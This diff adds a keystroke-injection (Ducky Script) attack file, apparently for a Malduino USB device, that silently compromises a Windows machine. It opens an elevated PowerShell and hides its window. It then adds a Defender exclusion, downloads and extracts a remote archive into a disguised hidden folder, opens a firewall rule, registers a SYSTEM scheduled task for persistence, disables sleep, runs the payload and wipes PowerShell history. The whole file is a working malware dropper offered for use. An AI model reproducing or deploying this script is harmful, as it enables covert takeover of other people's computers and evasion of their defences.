@@ -1,0 +1,44 @@
+DELAY 1000
+REM Open Run prompt
+GUI r
+DELAY 1000
+REM Start elevared PowerShell
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Shrink PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+REM Preparing hidden PowerShell window for payload
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING cd C:\Windows;
+STRING Mkdir Registry;
+STRING Add-MpPreference -ExclusionPath C:\Windows\Registry;
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/Gyanbu/MalduinoScripts/raw/master/Registry.zip','C:\Windows\Registry.zip');
+STRING Expand-Archive -Path Registry.zip -force;
+STRING Remove-Item Registry.zip;
+STRING cd Registry;
+STRING attrib +s +h /s /d;
+STRING attrib +s +h .;
+STRING New-NetFirewallRule -DisplayName 'Registry' -Direction Inbound -Program 'C:\Windows\Registry\Registry.exe' -Action Allow;
+STRING Register-ScheduledTask Registry 
+STRING -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Registry\Registry.vbs' -WorkingDirectory 'C:\Windows\Registry') 
+STRING -Trigger (New-ScheduledTaskTrigger -AtLogon) 
+STRING -Principal (New-ScheduledTaskPrincipal -UserID 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -f;
+STRING powercfg.exe -x -monitor-timeout-ac 0;
+STRING powercfg.exe -x -monitor-timeout-dc 0;
+STRING powercfg.exe -x -disk-timeout-ac 0;
+STRING powercfg.exe -x -disk-timeout-dc 0;
+STRING powercfg.exe -x -standby-timeout-ac 0;
+STRING powercfg.exe -x -standby-timeout-dc 0;
+STRING powercfg.exe -x -hibernate-timeout-ac 0;
+STRING powercfg.exe -x -hibernate-timeout-dc 0;
+STRING .\Registry.vbs
+REM End of payload
+REM Clear PowerShell history and exit
+STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
+ENTER
